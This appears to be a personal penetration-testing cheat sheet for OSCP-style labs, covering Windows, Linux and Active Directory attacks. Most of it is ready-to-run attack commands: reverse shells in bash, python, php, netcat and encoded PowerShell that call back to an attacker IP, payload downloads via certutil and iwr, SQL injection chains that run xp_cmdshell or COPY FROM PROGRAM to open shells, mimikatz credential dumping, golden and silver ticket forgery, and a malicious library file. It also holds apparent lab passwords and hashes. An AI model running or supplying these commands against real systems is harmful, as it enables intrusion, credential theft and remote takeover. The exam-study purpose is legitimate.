# FEEL LIKE STUCK???
- Did we run cmdkey /list?
- Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
- Did we check all the files inside of .config??
- Did we try checking "EVERYTHING" inside of user's folder?(ex. .bash_aliases, .bash_history..)
- Did we try crackmapexec mssql 192.168.x.x ...?
- Make sure to check history as admin after rooting first machine (smb)
- Did you try uploading files on inetpub?? ( we can get service account that has seimpersonateprivilege)
- Did we search cve-2020-xx github, exploit...blahblah?
- Did we run "impacket-GetUserSPNs 'oscp.exam/web_svc' -dc-ip 10.10.135.146 -request" ??
- Did we check AutoLogon registery?? reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"?
- Did we try ftp login with admin:admin, ftp:ftp etc?
- Did we check Groups.xml?(crack with gpp-decrypt)
- Did we try crackmapexec, enum4linux, smbclient, smbmap, rpcclient, ldapsearch anonymously/guestuser?
- Did we look into any suspicious binaries using strings?
- Did we try reverse shell with port with 443,80,445? (Learn this from PG Practice Helpdesk, Craft2)
- Did we create correct revshell for the victim architecture?
- Powershell location :: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Did we check "C:\Program Files" "C:\Profram Files (x86)" for vulnerable apps?(ex. PaperStream IP)
- Did we choose x32 bit dll for x32 executable? (Check jacko)
- Did we try "cmd.exe /c dir"
- Did we check scheduled tasks?
- Did we try C:\\TEMP\\revshell instead of C:\TEMP\revshell? 
- Did we try creating our own account on web service?
- Did we search with version number?
- Did we check all user's directories?
- Did we search port number with + exploit?
- Did we submit form using burp suite so we can see what we're submitting?(not everything is displayed)
- Did we run nikto?(There might be webdav hidden under root directory)
- Can our current system has File Write permission as system?(WerTrigger: https://github.com/sailay1996/WerTrigger)
- Did we check windows build version?(old versions have exploits)
- Did I miss $ sign from username? (svc_apache$ not svc_apache)
- Can we change user's password on database?


# Exploit I encountered

```bash
# initial
website with a url input --> responder
website with input --> sqli
ftp where i can upload a reverse webshell
db file where i had to change its name from db to db.sqlite and check it with the viewer
.git, .gitconfig
random ports(3003,3000)
snmp 161 --> credentials
FreeSWITCH mod_event_socket


# pivoting or privilege escalation
impacket-getuserspn ( make sure to point at dc)
internally running service --> check out on running process to find vulnerable service or hints(jdwp)
windows.old -> download SAM and SYSTEM and use secretsdump to extract hashes
putty session -> pivot
mimikatz.exe -> domain credentials
password inside a config file(coudlnt find with lse.sh but with linpeas)
scheduled executable path
able to change executable path i could start
albe to change executable path i coudln't start but could start with shutdown
unusual setuid binaries(php, screen)
sudo -l (gcore)
credentials from running process!
cronjob that runs every minute
kernel exploit(https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
admintool.exe (by running exe file we found admin password. make sure to run after triggering revshell7777.exe)


```



# NMAP tips
```bash
nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT
sudo nmap -A -p- -T4 192.168.245.145
sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149
sudo nmap -T4 -p445 --script smb-vuln* 192.168.186.40
```


# Default Credentials
```bash
test every username with password 'password'
linux can be case sensitive so make suer to try out Capitalized name

admin:admin
admin:password
admin:null
root:root
root:password
root:null
platform:platform
foundusername:foundusername
```

# Google Search tips
- xyz htb
- xyz hack the box
- xyz poc
- xyz exploit
- xyz version x.x vulnerabilities
- xyz github


# With Correct Credentials
- crackmpaexec smb all_ips --users
    - with newly found users, try found passwords on crackmapexec smb with just one machine
- crackmapexec winrm all_ips
- xfreerdp with all_ips

# PDF files
- exiftool to find username and use same usernames for password
- read contents on windows

# Linux
## Enumeration
```bash
- sudo -l
- Search for locally running service to pivot as service account?
- Running Process for hidden credentials?
- Any backup files?
- ss -lntp
- ps -ef

```


## Find all directories which can be written to by current user:
```bash
$ find / -executable -writable -type d 2> /dev/null
```

## kill process on a port
```bash
fuser -k 8080/tcp
```


# Windows

## Enumeration
```bash
# If there's smb, must check for anonymous login
crackmapexec smb 192.168.x.x -u 'random' -p '' --shares

# Users and groups
> whoami /priv
> whoami /groups
> net user
> net user admin
> net localgroup | Get-LocalGroup
> net localgroup Administrators | Get-LocalGroupMember Administrators

# AD Users and groups
> net user /domain
> net user jeffadmin /domain
> net group /domain
> net group "Sales Department" /domain


> systeminfo(OS NAME, OS VERSION)
> ipconfig
> netstat -ano

# Installed Applications
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Scheduled tasks: Check Process || query schtasks
> Get-Process
# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

# Scheduled tasks
> schtasks /query /fo LIST /v


# Putty
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AutoLogon
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# cmdkey /list
>


# Search for Modifiable services/executables with PowerUP.ps1
> . .\PowerUp.ps1
> Get-ModifiableServiceFile


# Modifiable services/executables
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
# Check StartMode
> Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
> sc qc servicename

> shutdown /r /t 0
> net stop service && net start service
> Restart-Service service


# Search for juicy files
> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> Get-History
> (Get-PSReadlineOption).HistorySavePath
> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig -File -Recurse -ErrorAction SilentlyContinue
> Check every user's directory && desktop && documents && downloads
> dir /A (display hidden files)
> dir /s *pass* == *.config
> findstr /si password *.xml *.ini *.txt



```

## whoami /priv
```bash
SeManageVolumePrivilege
```

## Powershell Encrypt && Decrypt credentials
```bash
# Encryption
$pwd = “Welcome@123”
$securepwd = $pwd | ConvertTo-SecureString -AsPlainText -Force
$encryptedpwd = $securepwd | ConvertFrom-SecureString
write-host $encryptedpwd

# Decryption
$pw = Get-Content .creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword

hHO_S9gff7ehXw
```

# Active Directory Tools

## secretsdump
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## enum4linux
```bash
enum4linux -a 192.168.201.175
```

## rpcclient
```bash
rpcclient 10.10.10.10
rpcclient 10.10.10.10 -U '' -N
> enumdomusers
```

## gpp-decrypt(Groups.xml)
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
```


## smbmap
```bash
smbmap -H 192.168.x.x
smbmap -H 192.168.x.x -u '' -p ''
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5

```

## net on kali
```bash
<Add user to Remote Access group on kali linux using net> 
net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.White%zqwj041FGX -S 192.168.193.30 

```



## PowerView.ps1
```bash
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn

Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member

# Enumerate the computer objets in the domain
Get-NetComputer
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

# Find possible local administrative access on computers under the current user context.
Find-LocalAdminAccess

# Enumerate Logged on Users
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose

# Enumerate Logged on Users For newer version
.\PsLoggedon.exe \\files04
.\PsLoggedon.exe \\web04
.\PsLoggedon.exe \\client74

# Enumerate Service Principal Names
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe web04.corp.com

# Enumerate Object Permissions
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member

# Enumerate Domain shares(Check SYSVOL!)
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

## AS-REP Roasting
```bash
GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass

impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
.\Rubeus.exe asreproast /nowrap

```


## Kerberoast
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

## Overpass the Hash
```bash
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
net use \\files04
.\PsExec.exe \\files04 cmd
```


## Pass the Ticket
```bash
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
ls \\web04\backup
```


## Silver Tickets
![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
```bash
#Get domain SID
whoami /user
#IIS service ntlm from mimikatz or somewhere
#mimikatz silver ticket attack
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
iwr -UseDefaultCredentials http://web04

# on kali machine
ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
```

## SharpHound.ps1
```bash
powershell -ep bypass
. .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
```


## Golden Tickets
```bash
# on windows
privilege::debug
lsadump::lsa
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
PsExec64.exe \\DC1 cmd.exe


# on kali
impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
export KRB5CCNAME=./Administrator.ccache     
mousepad /etc/resolv.conf
    add > nameserver 192.168.x.x
(or add dc1.corp.com inside of /etc/hosts file otherwise this attack will fail)
psexec.py Administrator@dc1.corp.com -k -no-pass
```


## Add user
```bash
> net user nuri password123! /add
> net localgroup administrators nuri /add

```

## crackmapexec
```bash
# local auth
--local-auth

#smb
crackmapexec smb 192.168.x.x -u '' -p '' --pass-pol
crackmapexec smb 192.168.x.x -u '' -p '' --shares
crackmapexec smb 192.168.x.x -u 'rand' -p '' --shares

crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success

#ssh
crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success

#ftp
crackmapexec ftp 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success

#mssql
crackmapexec mssql 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM

#winrm
crackmapexec winrm 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm 192.168.x.x  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'

```

## psexec
```bash
psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247
psexec.py active.htb/administrator@10.129.193.5


When psexec not working
  - crackmapexec smb -x whoami
  - xfreerdp
  - winrm
  - See if we can upload files through shares using smbclient
```


## mimikatz
```bash
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
```

## Invoke-Mimikatz
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'

```

## Code Snippet to check where our code is executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

## PrintSpoofer
```bash
iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```

## RoguePotato
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```

## GodPotato
```bash
Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd ".\revshell7777.exe"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```

# HTTP/HTTPS(80,8080,8000,443...)
## HTTP Checklist
- Run feroxbuster?
    - └─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.193.231/ -C 404,401,403 -x php,aspx,asp,jsp
- Run gobuster?
    - 
- Check every directory and file?
- LFI OR Local File Inclusion (ex. http://192.168.249.12/index.php?page=somepage.php)
  
- PHP wrapper(LFI)
  - php://filter/convert.base64-encode/resource=index
  - php://filter/convert.base64-encode/resource=index.php
        - When we want to decrypt base64: echo "blahblahblahblah..." | base64 -d
-Data wrapper(LFI)
    - data://text/plain,<?php%20echo%20system('ls');?> # without encoding
      
    - echo -n '<?php echo system($_GET["cmd"]);?>' | base64  #PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
    - data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
    
- Zip wrapper(LFI)
    - http://192.168.173.229/index?file=zip://uploads/upload_1705500922.zip%23rev
    - http://192.168.173.229/index.php?file=zip://uploads/upload_1708042099.zip%23simple-backdoor&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F443%200%3E%261%22
- File Traversal
    - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    - /home/someone/.ssh/id_rsa
    - /home/someone/.ssh/
    - /home/someone/.ssh/
    - /home/someone/.ssh/
    - /home/someone/.ssh/
- Find CMS and its version?
- SQLi?


## hydra
```bash
# POST 
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# GET
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.211.201 http-get /
```

## Checklist
- wappalyzer
- sitemap.xml
- robots.txt
- check favicon
-  

## gobuster
```bash
gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,pdf
```

## feroxbuster (must add -x 
```bash
└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 -k
```


## nikto: find webdav, other vuln
```bash
nikto -h http://192.168.222.122
```


## cadaver(username,password required)
```bash
# first create a reverse shell(asp, aspx)
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f aspx > shell.aspx

# connect to cadaver
cadaver http://10.3.20.218/webdav
put /root/offsec/shell.aspx
```

## exiftool
```bash
exiftool -a -u brochure.pdf
```

## wpscan: wordpress
```bash

```


## phpmyadmin: default password
- use default password(password can be null)
- upload php uploader: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
- upload simple-backdoor.php through SQL



# PORT 445: SMb
## crackmapexec smb
```bash
crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
crackmapexec smb <% ["RHOST"] %> -u "" -p "" --pass-pol

```

## smbclient
```bash
smbclient //10.129.193.5/Replication
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *

smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
smbclient //10.129.193.5/Users -U active.htb/svc_tgs


# Download large volume
> tarmode
```

## smbserver
```bash
sudo smbserver.py -smb2support share $(pwd) 
sudo smbserver.py -smb2support share $(pwd) -user kali -password kali

```


# PORT 389,3268: LDAP
## ldapsearch: focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

# kerbrute
```bash
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```

# SNMP(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


## socat
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
```

## Reverse shell
```bash
# bash
bash -i >& /dev/tcp/192.168.45.176/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.176/80 0>&1'
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F80%200%3E%261%22
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


#netcat reverse shell
nc -e /bin/sh 192.168.45.176 80

#PHP reverse shell
php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'


# Powershell: w powercat
IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell

# when executing with base64 encoded
powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=

# Powershell: wo powercat
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


#Powershell: Create powershell reverse shell on kali linux
$ kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText

```

## curl
```bash
# GET Request
curl -i http://192.168.50.16:5002/users/v1/admin/password

# POST Request
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

# PUT Request
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

## File Download(When not working, make sure to use 80 and also try it without http://)
```bash
#certutil
certutil -urlcache -split -f http://192.168.45.176:8000/winPEAS.exe c:/users/public/winPEAS.exe

#wget
wget http://192.168.45.176:8000/rev.sh
wget -P /tmp/rev.sh http://192.168.45.176:8000/rev.sh


#powershell
iwr -uri http://192.168.45.176:8000/winPEAS.exe -outfile c:/users/public/winPEAS.exe

#curl
curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>

```

# SSH
## SSH KEYGEN
```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

## SSH Crack Paraphrase
```bash
$ ssh2john anita_id_rsa > ssh_key
$ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
```


## SSH 
```bash
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
```


# File Read Exploit
- If the server is running with NY SYSTEM or sudo(root), we can grab any files
- Check SSH Keys [id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa]
  - /home/username/{id_rsa}
  - /home/username/.ssh/{id_rsa}  
- find password files for other program that's running(for authenticated exploit that we can actually get reverse shell)
- /etc/passwd
- /etc/shadow
- /home/username/.bash_history
- /home/username/.bash_aliases

# SQLi
## mssql
```bash
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --


or
sudo Responder -I tun0 -A
';EXEC xp_dirtree \\192.168.45.176\share
```

## postgresql
```bash
' order by 7 -- //
' union select 1, 1, 1, 1, 1, 1 -- //
' union select 'd', 1, 1, 'd', 'd', null -- //

# Current user
' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //

# Use cast to cause error to get the database
' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
## ERROR
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />

# Use case to find out tables
cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out columns for each table
cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out row for each column
cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)


# Get current user's password!
' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
```

## **CVE-2019–9193**
```bash

1) [Optional] Drop the table you want to use if it already exists

*DROP TABLE IF EXISTS cmd_exec;*

2) Create the table you want to hold the command output

*CREATE TABLE cmd_exec(cmd_output text);*

3) Run the system command via the COPY FROM PROGRAM function

*COPY cmd_exec FROM PROGRAM ‘id’;*

```bash
ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
```

4) [Optional] View the results

*SELECT * FROM cmd_exec;*

5) [Optional] Clean up after yourself

*DROP TABLE IF EXISTS cmd_exec;*
```


## Library
```bash
# First run wsgi
/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav

## malicious library file
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.176</url>
</simpleLocation>
